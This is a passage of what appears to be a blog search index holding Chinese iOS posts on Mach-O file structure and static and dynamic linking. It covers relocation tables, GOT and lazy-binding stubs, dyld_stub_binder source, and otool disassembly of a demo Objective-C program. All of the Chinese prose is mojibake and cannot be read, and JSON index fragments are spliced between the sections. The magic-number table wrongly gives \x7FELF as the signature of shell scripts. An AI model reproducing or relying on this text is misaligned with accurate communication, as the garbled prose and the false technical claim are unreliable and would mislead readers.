fizz å’Œ global ç¬¦å·åœ°å€ä¸ºä¸´æ—¶åœ°å€ï¼Œmain.o ä¸­ main ç¬¦å·ä¸ºä¸´æ—¶åœ°å€ï¼Œfizz å’Œ global ç¬¦å·æœªå®šä¹‰ï¼Œé™æ€é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ main åï¼Œå‘ç°å„ç¬¦å·éƒ½æœ‰äº†å¯¹åº”åœ°å€ï¼Œè¿™ä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆå‘¢ï¼Ÿ å…¶ä¸­å…³é”®å°±æ˜¯ç¬¦å·çš„è§£æå’Œé‡å®šä½ã€‚ ç”¨ MachOView æŸ¥çœ‹ main.o æ–‡ä»¶ï¼š ä»£ç ä¸­ç¬¦å·çš„ä½ç½®ç”¨ global å’Œ fizz æš‚æ—¶ç”¨0x0å’Œ0x2cæ›¿ä»£ï¼Œé“¾æ¥å™¨åœ¨å®Œæˆåœ°å€ç©ºé—´åˆ†é…åï¼Œå°±å¯ä»¥ç¡®å®šç¬¦å·çš„è™šæ‹Ÿåœ°å€äº†ï¼Œé“¾æ¥å™¨æ ¹æ®ç¬¦å·åœ°å€å¯¹æ¯ä¸ªéœ€è¦é‡å®šä½çš„æŒ‡ä»¤è¿›è¡Œåœ°å€ä¿®æ­£ï¼Œé€šè¿‡ _text å¤´ä¸­å¯ä»¥çœ‹åˆ°éœ€è¦é‡å®šä½çš„æœ‰ä¸‰å¤„ä»¥åŠé‡å®šä½è¡¨åç§»ï¼ˆ488 = 0x1E8ï¼‰ã€‚ è€Œå…·ä½“é‡å®šä½ä¿¡æ¯åœ¨é‡å®šä½è¡¨ Relocations ä¸­ï¼š é‡å®šä½è¡¨ç»“æ„ä¸ºï¼š struct relocation_info { int32_t r_address; /* offset in the section to what is being relocated */ uint32_t r_symbolnum:24, /* symbol index if r_extern == 1 or section ordinal if r_extern == 0 */ r_pcrel:1, /* was relocated pc relative already */ r_length:2, /* 0=byte, 1=word, 2=long, 3=quad */ r_extern:1, /* does not include value of sym referenced */ r_type:4; /* if not 0, machine specific relocation type */ }; å…¶ r_symbolnum å…·ä½“ä¸º Symbol ç¬¦å·è¡¨ä¸­ index ç¬¦å·è¡¨æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…ƒç´ ç»“æ„ä¸º nlist_64ï¼š struct nlist_64 { union { uint32_t n_strx; /* index into the string table */ } n_un; uint8_t n_type; /* type flag, see below */ uint8_t n_sect; /* section number or NO_SECT */ uint16_t n_desc; /* see \u003cmach-o/stab.h\u003e */ uint64_t n_value; /* value of this symbol (or stab offset) */ }; é“¾æ¥åï¼ˆmainï¼‰çš„ç¬¦å·è¡¨ï¼Œå…¶ n_value å·²ç»æ›¿æ¢ä¸ºçœŸå®åœ°å€ï¼š ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:1:0","tags":["iOS","AOP"],"title":"é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"åŠ¨æ€é“¾æ¥ é™æ€é“¾æ¥æ˜¯è¿è¡Œå‰å°±ç”¨ ld é“¾æ¥å™¨é“¾æ¥æˆä¸€ä¸ªå®Œæ•´çš„ç¨‹åºï¼Œè€ŒåŠ¨æ€é“¾æ¥æ˜¯ç¨‹åºä¸»æ¨¡å—è¢«åŠ è½½æ—¶å€™ï¼Œé€šè¿‡ dyld åŠ è½½å‘½ä»¤ï¼ŒæŠŠ dylib åŠ è½½åˆ°å†…å­˜ï¼Œç„¶åå°†ç¨‹åºä¸­æ‰€æœ‰æœªå†³è®®çš„ç¬¦å·ç»‘å®šåˆ°ç›¸åº”çš„ dylib ä¸­ï¼Œå¹¶è¿›è¡Œé‡å®šä½å·¥ä½œã€‚ åŠ¨æ€é“¾æ¥å™¨åŠ è½½å‘½ä»¤ LC_LOAD_DYLINKERï¼š åŠ¨æ€é“¾æ¥åº“åŠ è½½å‘½ä»¤ LC_LOAD_DYLIBï¼š è¿˜æ˜¯ç”¨ä¹‹å‰çš„ ğŸŒ° ï¼Œä½†æ˜¯æˆ‘ä»¬é€šè¿‡åŠ¨æ€é“¾æ¥åº“ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ main_dyld âœ ios xcrun -sdk iphoneos clang -c main.c -o main_dyld.o -target arm64-apple-ios13.4 âœ ios xcrun -sdk iphoneos clang -fPIC -shared bar.c -o libbar.dylib -target arm64-apple-ios13.4 âœ ios xcrun -sdk iphoneos clang main_dyld.o -o main_dyld -L . -l bar -target arm64-apple-ios13.4 æˆ‘ä»¬æŸ¥çœ‹ main_dyld çš„ç¬¦å·è¡¨ï¼Œå‘ç°å¹¶æ²¡æœ‰çœŸå®åœ°å€ï¼Œä½†æ˜¯æ ‡è®°äº†è¯¥ç¬¦å·æ¥è‡ªåŠ¨æ€åº“ libbar.dylibï¼š æˆ‘ä»¬è·Ÿè¸ª _TEXT,__text çœ‹ä¸‹ global å˜é‡ å’Œ fizz å‡½æ•°æ˜¯å¦‚ä½•é‡å®šä½çš„ global æ˜¯é€šè¿‡ adrp å’Œ ldr æŒ‡ä»¤é—´æ¥å¯»å€ï¼Œå–0x100008000é‡Œé¢çš„å€¼ï¼Œè€Œè¿™ä¸ªåœ°å€æŒ‡å‘çš„ got(ä¹Ÿç§° Non-Lazy Symbol Pointers ) è¡¨ä¸­ï¼š åœ¨ç¨‹åºè£…è½½è¿‡ç¨‹ä¸­ï¼Œä¼šé‡å®šä½ got è¡¨ä¸­åœ°å€ï¼Œä½†æ˜¯å¦‚ä½•çŸ¥é“è¿™æ˜¯ä»€ä¹ˆç¬¦å·ï¼Ÿä»¥åŠè¿™ä¸ªç¬¦å·æ¥è‡ªå“ªé‡Œï¼Ÿ è¿™å°±éœ€è¦ç”¨åˆ° Section64 Header(__got) ä¸­çš„ reserved1 å­—æ®µï¼Œå®ƒä»£è¡¨åœ¨é—´æ¥ç¬¦å·è¡¨ï¼ˆIndirect Symbolsï¼‰ä¸­çš„ index è€Œé—´æ¥ç¬¦å·è¡¨æœ¬èº«å­˜çš„æ˜¯ç¬¦å·è¡¨ä¸­çš„ indexï¼Œå¯ä»¥çœ‹åˆ° index=1 çš„é¡¹å€¼ä¸º4ï¼Œä»£è¡¨ç¬¦å·è¡¨ä¸­ index=4 çš„é¡¹ 22ä»£è¡¨åœ¨ String Table ä¸­åç§»22çš„å­—ç¬¦ä¸²ï¼Œå³ä¸º _globalï¼Œå¹¶ä¸”æè¿° _global æ¥è‡ª libbar.dylib åŠ¨æ€åº“ï¼Œè§£å†³äº†ä¸Šè¿°ä¸¤ä¸ªé—®é¢˜ï¼Œç°åœ¨å¯ä»¥é‡å®šä½ got è¡¨ä¸­ç¬¬ä¸€ä¸ªç¬¦å·åœ°å€ã€‚ åœ¨çœ‹ä¸‹ fizz å‡½æ•°çš„é‡å®šä½è¿‡ç¨‹ bl #0x100007f88 æŒ‡å‘ _stubs ç¬¦å·æ¡©ä¸­ âœ ios otool -v main_dyld -s __TEXT __stubs main_dyld: Contents of (__TEXT,__stubs) section 0000000100007f88 nop 0000000100007f8c ldr x16, #0x4074 ; Latency: 4 0000000100007f90 br x16 0x7f8c + 0x4074 = 0xc000 æŒ‡å‘ __la_symbol_str æ•°æ®æ®µ åŒæ ·æˆ‘ä»¬æ ¹æ® Section64 Header(la_symbol_str) ä¸­çš„ reserverd1 èƒ½å¤ŸçŸ¥é“å…¶ç¬¦å·åä¸º _fizzï¼Œè€Œè¯¥å‡½æ•°çš„å…·ä½“å®ç°æŒ‡å‘äº† 0x7fac ï¼ˆstub_helper æ¡©ä»£ç æ®µ) é€šè¿‡ b #0x100007f94 è·³åˆ°èŠ‚å¤´åœ°å€ï¼Œç„¶åèµ°åˆ° br x16 ï¼Œx16 ä¸ºå­˜å‚¨ 0x1000080008 åœ¨çš„ dyld_stub_binder å‡½æ•° è¿™ä¸ªæˆ‘ä»¬åœ¨Mach-Oæ–‡ä»¶ç»“æ„åˆ†æä¸­å·²ç»è®²è¿‡ï¼Œæ˜¯ä¸€ä¸ªå»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°ï¼Œä¼šè°ƒç”¨ dyld_stub_binder å‡½æ•°å»å¯»å€å‡½æ•°åœ°å€ï¼Œç„¶åå†™å…¥ __la_symbol_str æ®µï¼Œä¹‹åå†è°ƒåŒæ ·çš„å‡½æ•°å°±ä¼šç›´æ¥è®¿é—®å‡½æ•°å®ç°åœ°å€ã€‚æˆ‘ä»¬çœ‹ä¸‹ dyld_stub_binder å…·ä½“æºç å®ç°ï¼š #if __arm__ /* * sp+4 lazy binding info offset * sp+0 address of ImageLoader cache */ .text .align 2 .globl dyld_stub_binder dyld_stub_binder: stmfd sp!, {r0,r1,r2,r3,r7,lr} // save registers add r7, sp, #16 // point FP to previous FP ldr r0, [sp, #24] // move address ImageLoader cache to 1st parameter ldr r1, [sp, #28] // move lazy info offset 2nd parameter // call dyld::fastBindLazySymbol(loadercache, lazyinfo) bl __Z21_dyld_fast_stub_entryPvl mov ip, r0 // move the symbol`s address into ip ldmfd sp!, {r0,r1,r2,r3,r7,lr} // restore registers add sp, sp, #8 // remove meta-parameters bx ip // jump to the symbol`s address that was bound #endif /* __arm__ */ è°ƒç”¨ fastBindLazySymbol å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¹Ÿå¯ä»¥åœ¨ git ä¸Šæ‰¾åˆ°ï¼š uintptr_t fastBindLazySymbol(ImageLoader** imageLoaderCache, uintptr_t lazyBindingInfoOffset) { uintptr_t result = 0; // get image if ( *imageLoaderCache == NULL ) { // save in cache *imageLoaderCache = dyld::findMappedRange((uintptr_t)imageLoaderCache); if ( *imageLoaderCache == NULL ) { const char* message = \"fast lazy binding from unknown image\"; dyld::log(\"dyld: %s\\n\", message); halt(message); } } // bind lazy pointer and return it try { result = (*imageLoaderCache)-\u003edoBindFastLazySymbol((uint32_t)lazyBindingInfoOffset, gLinkContext, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-\u003eacquireGlobalDyldLock : NULL, (dyld::gLibSystemHelpers != NULL) ? dyld::gLibSystemHelpers-\u003ereleaseGlobalDyldLock : NULL); } catch (const char* message) { dyld::log(\"dyld: lazy symbol binding failed: %s\\n\", message); halt(message); } // return target address to glue which jumps to it with real parameters restored return result; } çœŸæ­£è¿›è¡Œç¬¦å·ç»‘å®šçš„æ“ä½œåœ¨ doBindFastLazySymbol ä¸­ï¼š uintptr_t ImageLoaderMachOCompressed::doBindFastLazySymbol(uint32_t lazyBindingInfoOffset, const LinkContext\u0026 context, void (*lock)(), void (*unlock)()) { // \u003crdar://problem/8663923\u003e race condition with flat-namespace lazy binding if ( this-\u003eusesTwoLevelNameSpace() ) { // two-level namespace lookup does not require lock because dependents can't be unloaded before this image } else { // acquire dyld global lock if ( lock != NULL ) lock(); } const uint8_t* const start = fLinkEditBase + fDyldInfo-\u003elazy_bind_off; const uint8_t* const end = \u0026start[fDyldInfo-\u003elazy_bind_size]; if ( lazyBindingInfoOffset \u003e fDyldInfo-\u003elazy_bind_size ) { dyld::throwf(\"fast lazy bind offset out of range (%u, max=%u) in image %s\", lazyBi","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:0","tags":["iOS","AOP"],"title":"é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"PICåŸç† ä¸Šè¿° global å’Œ fizz ä¸¤ä¸ªç¬¦å·æ˜¯åœ¨åŠ¨æ€åº“ä¸­ï¼Œè€ŒåŠ¨æ€åº“æ˜¯å¯ä»¥è¢«å¤šä¸ªè¿›ç¨‹å…±äº«çš„ï¼Œè€ŒåŠ¨æ€åº“ç¼–è¯‘æ—¶ä¸çŸ¥é“è‡ªå·±åœ¨è¿›ç¨‹ä¸­çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œå› æ­¤åŠ¨æ€åº“ä¸­ä¸èƒ½åŒ…å«ç»å¯¹åœ°å€ï¼Œé‚£åŠ¨æ€åº“å¦‚ä½•å°†ä»£ç æ®µåšåˆ°ä¸ä½ç½®æ— å…³å…±äº«å‡ºå»ï¼Œå°±éœ€è¦å°†å¯¹åœ°å€çš„å¼•ç”¨åˆ†ç¦»ï¼Œæ”¾åˆ°ä¸»ç¨‹åºæ•°æ®éƒ¨åˆ†ï¼ˆå¯ä¿®æ”¹ï¼‰ï¼Œåœ¨åŠ è½½å’Œè¿è¡Œè¿‡ç¨‹åšå¯»å€ç»‘å®šæ“ä½œã€‚ ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:1","tags":["iOS","AOP"],"title":"é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":"got å’Œ la_symbol_ptr é€šè¿‡ä¸Šè¿°åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŠ¨æ€åº“æ•°æ® (global) åœ°å€æ”¾åˆ° got (Non-Lazy Symbol Pointers) æ•°æ®æ®µï¼Œéæƒ°æ€§ä»£è¡¨åŠ¨æ€é“¾æ¥é˜¶æ®µå°±å¯»æ‰¾å¥½æ‰€æœ‰æ•°æ®ç¬¦å·çš„åœ°å€ï¼›è€Œå‡½æ•° (fizz) ç”¨äº†å»¶è¿Ÿç»‘å®šæŠ€æœ¯ï¼Œå°†å¤–éƒ¨å‡½æ•°åœ°å€æ”¾åœ¨ la_symbol_ptr (Lasy Symbol Pointers) æ•°æ®æ®µï¼Œæƒ°æ€§çš„ï¼Œç¨‹åºç¬¬ä¸€æ¬¡è°ƒç”¨åˆ°è¿™ä¸ªå‡½æ•°æ‰å¯»å€çœŸå®åœ°å€å¹¶å†™å…¥è¿™ä¸ªæ•°æ®æ®µã€‚ ","date":"2021-03-05","objectID":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html:2:2","tags":["iOS","AOP"],"title":"é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥","uri":"/posts/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5.html"},{"categories":["iOS"],"content":" iOS AOPæ–‡ç« ç³»åˆ— å‰å¯¼çŸ¥è¯†ï¼š Mach-Oæ–‡ä»¶ç»“æ„åˆ†æ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ OCæ–¹æ³•\u0026OCç±»\u0026OCå¯¹è±¡ æ–¹æ³•æŸ¥æ‰¾å’Œæ¶ˆæ¯è½¬å‘ AOPæ¡†æ¶ï¼š Method Swizzling Fishhook Apsects NSProxy AOP ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:0:0","tags":["iOS","AOP"],"title":"Mach-O æ–‡ä»¶ç»“æ„åˆ†æ","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"äºŒè¿›åˆ¶ç»“æ„ ä½¿ç”¨ MachoView å·¥å…·æŸ¥çœ‹äºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ï¼Œç»“æ„ä¸ºï¼š Header å¤´ä¸­é­”æœ¯æ•°å­—ï¼š å¯æ‰§è¡Œæ ¼å¼ magic ç”¨é€” è„šæœ¬ \\x7FELF ä¸»è¦ç”¨äº shell è„šæœ¬ï¼Œä½†æ˜¯ä¹Ÿå¸¸ç”¨è¯­å…¶ä»–è§£é‡Šå™¨ï¼Œå¦‚ Perl, AWK ç­‰ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„è„šæœ¬æ–‡ä»¶ä¸­åœ¨ #! æ ‡è®°åçš„å­—ç¬¦ä¸²ï¼Œå³ä¸ºæ‰§è¡Œå‘½ä»¤çš„æŒ‡ä»¤æ–¹å¼ï¼Œä»¥æ–‡ä»¶çš„ stdin æ¥ä¼ é€’å‘½ä»¤ é€šç”¨äºŒè¿›åˆ¶æ ¼å¼ 0xcafebabe 0xbebafeca åŒ…å«å¤šç§æ¶æ„æ”¯æŒçš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œåªåœ¨ macOS ä¸Šæ”¯æŒ Mach-O 0xfeedfaceï¼ˆ32 ä½ï¼‰ 0xfeedfacfï¼ˆ64 ä½ï¼‰ macOS çš„åŸç”ŸäºŒè¿›åˆ¶æ ¼å¼ Mach-O ä¸»è¦ä¸‰éƒ¨åˆ†ï¼š Header // æè¿° MachO çš„ cpu æ¶æ„ã€æ–‡ä»¶ç±»å‹å’ŒåŠ è½½å‘½ä»¤ç­‰ä¿¡æ¯ Load Command // æè¿°æ–‡ä»¶ä¸­æ•°æ®å…·ä½“ç»„ç»‡ç»“æ„ï¼Œä¸åŒæ•°æ®ç±»å‹ä½¿ç”¨ä¸åŒåŠ è½½å‘½ä»¤è¡¨ç¤ºï¼Œåœ¨æ–‡ä»¶åŠ è½½è§£ææ—¶ï¼Œè¢«å†…æ ¸åŠ è½½å™¨æˆ–åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨ï¼ŒåŒ…å«æ®µåŠ è½½å‘½ä»¤ï¼ˆLC_SEGMENT_64ï¼‰ Sections //åŠ è½½å‘½ä»¤è‹¥åŒ…å«èŠ‚ï¼ŒèŠ‚ä¸­å…·ä½“å­˜æ”¾æ•°æ®æˆ–ä»£ç  å…·ä½“æ•°æ®ç»“æ„å®šä¹‰å¯åœ¨æºç ä¸­æŸ¥çœ‹ï¼š Headerï¼š /* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */ struct mach_header_64 { uint32_t magic; /* mach magic number identifier */ cpu_type_t cputype; /* cpu specifier */ cpu_subtype_t cpusubtype; /* machine specifier */ uint32_t filetype; /* type of file */ uint32_t ncmds; /* number of load commands */ uint32_t sizeofcmds; /* the size of all the load commands */ uint32_t flags; /* flags */ uint32_t reserved; /* reserved */ }; Segment: /* * The 64-bit segment load command indicates that a part of this file is to be * mapped into a 64-bit task's address space. If the 64-bit segment has * sections then section_64 structures directly follow the 64-bit segment * command and their size is reflected in cmdsize. */ struct segment_command_64 { /* for 64-bit architectures */ uint32_t cmd; /* LC_SEGMENT_64 */ uint32_t cmdsize; /* includes sizeof section_64 structs */ char segname[16]; /* segment name */ uint64_t vmaddr; /* memory address of this segment */ uint64_t vmsize; /* memory size of this segment */ uint64_t fileoff; /* file offset of this segment */ uint64_t filesize; /* amount to map from the file */ vm_prot_t maxprot; /* maximum VM protection */ vm_prot_t initprot; /* initial VM protection */ uint32_t nsects; /* number of sections in segment */ uint32_t flags; /* flags */ }; Sections: struct section_64 { /* for 64-bit architectures */ char sectname[16]; /* name of this section */ char segname[16]; /* segment this section goes in */ uint64_t addr; /* memory address of this section */ uint64_t size; /* size in bytes of this section */ uint32_t offset; /* file offset of this section */ uint32_t align; /* section alignment (power of 2) */ uint32_t reloff; /* file offset of relocation entries */ uint32_t nreloc; /* number of relocation entries */ uint32_t flags; /* flags (section type and attributes)*/ uint32_t reserved1; /* reserved (for offset or index) */ uint32_t reserved2; /* reserved (for count or sizeof) */ uint32_t reserved3; /* reserved */ }; Note section_64 çš„ç»“æ„ä½“ä¸­æœ‰å‡ ä¸ªæ¯”è¾ƒé‡è¦çš„æ•°æ®ï¼Œreloffï¼ˆé‡å®šä½è¡¨åç§»ï¼‰ã€nrelocï¼ˆé‡å®šä½ç¬¦å·ä¸ªæ•°ï¼‰ã€reserved1ï¼ˆåŠ¨æ€ç¬¦å·è¡¨åç§»ï¼‰ï¼Œåœ¨é™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ä¸­å‘æŒ¥é‡è¦ä½œç”¨ã€‚ åœ¨ é™æ€é“¾æ¥\u0026åŠ¨æ€é“¾æ¥ æ–‡ç« ä¸­åŠ ä»¥ä»‹ç»ã€‚ ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:1:0","tags":["iOS","AOP"],"title":"Mach-O æ–‡ä»¶ç»“æ„åˆ†æ","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"ä¸¾ä¸ªğŸŒ°ç›´è§‚æ„Ÿå—ä¸‹ ç®€å•Demoç¨‹åºï¼š // person.m NSString *string1 = @\"it is string1\"; NSString *string2; @implementation Person - (void)sleep { NSLog(@\"i am sleeping\"); } - (void)walk { printf(@\"i am walking\"); } + (void)grow { static NSString *string3 = @\"it is string3\"; static NSString *string4; NSLog(@\"%@_%@\", string3, string4); } @end // person+other.m @implementation Person (other) - (void)ill { NSLog(@\"i am fall ill\"); } - (void)sleep { NSLog(@\"i need sleeping\"); } @end // main.m void run() { NSLog(@\"i am running\"); } int main(int argc, const char * argv[]) { @autoreleasepool { // insert code here... NSLog(@\"Hello, World!\"); Person *p = [[Person alloc] init]; [p walk]; [p ill]; [p sleep]; run(); } return 0; } ç¨‹åºåŒ…å« Person ç±»ï¼Œä¸¤ä¸ªå®ä¾‹æ–¹æ³•å’Œä¸€ä¸ªç±»æ–¹æ³•ï¼ŒåŒæ—¶åŒ…å«ä¸€ä¸ª Person çš„ Category ç±»ï¼Œé¢å¤–æ‰©å±•å’Œè¦†ç›–äº†åŸç±»ã€‚è¿˜å®ç°äº†ä¸€ä¸ª C å‡½æ•° run()ã€‚ åœ¨ LC_MAIN æ®µå¯ä»¥çŸ¥é“ç¨‹åº main å‡½æ•°å…¥å£åç§»åœ°å€ 0x3E00ï¼š å…·ä½“æ±‡ç¼–ä»£ç åœ¨ Section64(__TEXT,__text) ä¸­ï¼š æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ otool å·¥å…·åæ±‡ç¼–ä»£ç ï¼Œå…·ä½“åˆ†æä¸‹ç¨‹åºå¦‚ä½•ä½¿ç”¨å„æ®µèŠ‚æ•°æ® âœ Debug otool -tV TestMacho1 TestMacho1: (__TEXT,__text) section -[Person(other) ill]: 0000000100003ce0 pushq %rbp 0000000100003ce1 movq %rsp, %rbp 0000000100003ce4 subq $0x10, %rsp 0000000100003ce8 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003cef movq %rdi, -0x8(%rbp) 0000000100003cf3 movq %rsi, -0x10(%rbp) 0000000100003cf7 movq %rax, %rdi 0000000100003cfa movb $0x0, %al 0000000100003cfc callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d01 addq $0x10, %rsp 0000000100003d05 popq %rbp 0000000100003d06 retq 0000000100003d07 nopw (%rax,%rax) -[Person(other) sleep]: 0000000100003d10 pushq %rbp 0000000100003d11 movq %rsp, %rbp 0000000100003d14 subq $0x10, %rsp 0000000100003d18 leaq 0x311(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d1f movq %rdi, -0x8(%rbp) 0000000100003d23 movq %rsi, -0x10(%rbp) 0000000100003d27 movq %rax, %rdi 0000000100003d2a movb $0x0, %al 0000000100003d2c callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d31 addq $0x10, %rsp 0000000100003d35 popq %rbp 0000000100003d36 retq 0000000100003d37 nop 0000000100003d38 nop 0000000100003d39 nop 0000000100003d3a nop 0000000100003d3b nop 0000000100003d3c nop 0000000100003d3d nop 0000000100003d3e nop 0000000100003d3f nop -[Person sleep]: 0000000100003d40 pushq %rbp 0000000100003d41 movq %rsp, %rbp 0000000100003d44 subq $0x10, %rsp 0000000100003d48 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d4f movq %rdi, -0x8(%rbp) 0000000100003d53 movq %rsi, -0x10(%rbp) 0000000100003d57 movq %rax, %rdi 0000000100003d5a movb $0x0, %al 0000000100003d5c callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003d61 addq $0x10, %rsp 0000000100003d65 popq %rbp 0000000100003d66 retq 0000000100003d67 nopw (%rax,%rax) -[Person walk]: 0000000100003d70 pushq %rbp 0000000100003d71 movq %rsp, %rbp 0000000100003d74 subq $0x10, %rsp 0000000100003d78 leaq 0x311(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003d7f movq %rdi, -0x8(%rbp) 0000000100003d83 movq %rsi, -0x10(%rbp) 0000000100003d87 movq %rax, %rdi 0000000100003d8a movb $0x0, %al 0000000100003d8c callq 0x100003ec4 ## symbol stub for: _printf 0000000100003d91 addq $0x10, %rsp 0000000100003d95 popq %rbp 0000000100003d96 retq 0000000100003d97 nopw (%rax,%rax) +[Person grow]: 0000000100003da0 pushq %rbp 0000000100003da1 movq %rsp, %rbp 0000000100003da4 subq $0x10, %rsp 0000000100003da8 leaq 0x321(%rip), %rax ## Objc cfstring ref: @\"bad cfstring ref\" 0000000100003daf movq %rdi, -0x8(%rbp) 0000000100003db3 movq %rsi, -0x10(%rbp) 0000000100003db7 movq _grow.string3(%rip), %rsi 0000000100003dbe movq _grow.string4(%rip), %rdx 0000000100003dc5 movq %rax, %rdi 0000000100003dc8 movb $0x0, %al 0000000100003dca callq 0x100003ea6 ## symbol stub for: _NSLog 0000000100003dcf addq $0x10, %rsp 0000000100003dd3 popq %rbp 0000000100003dd4 retq 0000000100003dd5 nop 0000000100003dd6 nop 0000000100003dd7 nop 0000000100003dd8 nop 0000000100003dd9 nop 0000000100003dda nop 0000000100003ddb nop 0000000100003ddc nop 0000000100003ddd nop 0000000100003dde nop 00000","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:2:0","tags":["iOS","AOP"],"title":"Mach-O æ–‡ä»¶ç»“æ„åˆ†æ","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"æ€»ç»“ æ–‡ä¸­åˆ†ææ¶‰åŠåˆ°å¤šä¸ª Sectionï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œåšä¸ªæ±‡æ€» åç§° ä½œç”¨ __TEXT,__text å¯æ‰§è¡Œæœºå™¨ç  __TEXT,__stubs ç¬¦å·æ¡©ï¼Œè·³è½¬åˆ° __la_symbol_ptr è¡¨å¯¹åº”åœ°å€ __TEXT,__stub_helper æ¡©å‡½æ•°ï¼Œla_symbol_ptr è¡¨ä¸­æ²¡æœ‰æ‰¾åˆ°çœŸæ­£ç¬¦å·åœ°å€æ—¶ï¼Œå‡æŒ‡å‘è¿™ï¼Œé€šè¿‡ dyld_stub_binder æ‰¾åˆ°å‡½æ•°å®ç°åœ°å€å¹¶æ›¿æ¢ la_symbol_pt rè¡¨é¡¹ __TEXT,__cstring å­—ç¬¦ä¸² __TEXT,__objc_classname ç±»å __DATA,__cfstring ä¿å­˜ Objc å­—ç¬¦ä¸²ç±»å‹ã€å¤§å°ã€å€¼ä¿¡æ¯ __DATA,__objc_const _class_t ä¸­ class_ro_t ç»“æ„ä½“ï¼Œä»¥åŠç±»å‡½æ•°åˆ—è¡¨å­˜å‚¨åœ¨æ­¤èŠ‚ __DATA,__objc_selrefs SEL å‡½æ•°ååœ°å€ __DATA,__objc_classrefs OC ç±»åœ°å€ __DATA,__la_symbol_ptr åŠ¨æ€é“¾æ¥æ—¶ï¼Œå»¶è¿Ÿç»‘å®šéœ€è¦ï¼Œè·³è½¬åˆ° TEXT,stub_helper å¯¹åº”åœ°å€ __DATA,__objc_data _class_t ç±»ç»“æ„ä½“å­˜å‚¨åœ¨æ­¤èŠ‚ ","date":"2021-03-01","objectID":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html:3:0","tags":["iOS","AOP"],"title":"Mach-O æ–‡ä»¶ç»“æ„åˆ†æ","uri":"/posts/mach-o%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.html"},{"categories":["iOS"],"content":"æ¢ç©¶ åœ¨ MachO æ–‡ä»¶ç»“æ„è¿˜æœªè®²åˆ°çš„ LC_SEGMENT_64(_LINKEDIT)ã€LC_SYMTABã€LCDYSYMTABã€LC_LOAD_DYLIBã€Symbol Tableå’ŒDynamic Symbol Tableç­‰ä½œç”¨ è¿™äº›æ®µèŠ‚æ¶‰åŠé™æ€/åŠ¨æ€é“¾æ¥åŸç† åŠ¨æ€é“¾æ¥ä¸­å»¶è¿Ÿç»‘å®šæŠ€æœ¯ OCæ–¹æ³•æœ¬è´¨/OCç±»å¯¹è±¡/å®ä¾‹å¯¹è±¡ ç±»ç»“æ„ä½“ä¸­isaæŒ‡é’ˆ Runtime 